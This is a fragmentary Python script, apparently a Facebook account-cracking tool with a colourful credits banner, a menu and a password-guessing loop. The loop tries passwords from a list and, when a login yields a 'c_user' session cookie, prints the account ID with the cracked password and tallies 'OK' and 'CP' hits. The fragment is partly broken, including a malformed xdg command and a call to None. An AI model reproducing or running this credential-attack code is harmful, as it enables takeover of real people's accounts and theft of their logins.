...
def FD():
    ...
    if opt == '1':
        os.system('xdg-https://www.facebook.com/profile.php?id=100079143742521' )
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
\033[1;37m================= \33[32;45mPICCI\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mPICCI-ARIYAN
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m PICCHI-ARIYAN
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mPICCHI-ARIYAN
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTRAIL 
\033[1;32m     \033[1;35mFD         :  \033[1;35mPICCI-RIDOY-PICCI-PRAM
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m1.7.8
\033[1;37m================= \33[32;45mARIYAN\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO AAM TOOLS\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AAM-Cp¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[A-A-M] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
